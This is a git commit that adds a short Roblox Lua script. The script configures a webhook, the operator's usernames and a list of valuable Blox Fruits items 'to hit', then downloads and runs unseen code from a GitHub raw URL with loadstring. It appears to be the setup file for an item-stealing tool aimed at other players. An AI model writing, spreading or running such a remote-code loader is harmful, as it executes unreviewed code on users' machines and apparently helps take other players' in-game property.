0fd371b806af3dc7209894e1a17899d0e41847d1
Light0-m <justinburgosbeato@gmail.com>
2025-04-20 23:07:06 -0400

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=d1hBVHhIZ0ZUTTZmU0kzS1JyTHZGdzp1bmE3aEZQZFZLb1Bfcm1EdzlXb3dMNmM4bDh5bEhTdGNIcDBoWTc5TGctdnBhSkp5eElmYkJZaTMyM1VTTXZnSkFMelJucmhzNEJNM0hoV1NlVUNIM19KNGFrckpSalJMMDYycHc2YXBIb0lBWk9qcGxMdVBxdVJ4TVJNcjB2ZWt5NzhOTHk3djlEb0V2TmRBdU9oS0ZneHJvXzBjdVJKaEwxZG1tVlpqeGs" -- << Your Webhook
+Usernames = {"Light_andgreen", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon", "Gravity-Gravity"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
